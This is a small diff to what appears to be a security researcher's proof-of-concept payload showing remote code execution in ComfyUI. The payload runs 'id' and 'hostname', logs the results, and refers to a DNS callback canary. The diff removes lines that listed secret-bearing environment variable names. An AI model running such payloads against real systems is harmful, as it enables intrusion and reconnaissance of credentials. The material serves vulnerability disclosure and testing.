@@ -11,16 +11,14 @@ import subprocess
 try:
     id_output = subprocess.check_output(["id"], text=True).strip()
     hostname = subprocess.check_output(["hostname"], text=True).strip()
-    env_keys = [k for k in os.environ if any(s in k.upper() for s in ["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL"])]
 
-    proof = f"hostname: {hostname}\nid: {id_output}\npwd: {os.getcwd()}\nenv_secret_keys: {env_keys}\n"
+    proof = f"hostname: {hostname}\nid: {id_output}\npwd: {os.getcwd()}\n"
 
     # Channel 1: ComfyUI logs (readable via /internal/logs in browser)
     print(f"[PRAETORIAN-POC] === RCE PROOF ===")
     print(f"[PRAETORIAN-POC] {id_output}")
     print(f"[PRAETORIAN-POC] hostname: {hostname}")
     print(f"[PRAETORIAN-POC] cwd: {os.getcwd()}")
-    print(f"[PRAETORIAN-POC] secret env vars: {env_keys}")
     print(f"[PRAETORIAN-POC] === END PROOF ===")
 
     # Channel 2: interact.sh canary (DNS callback proof)
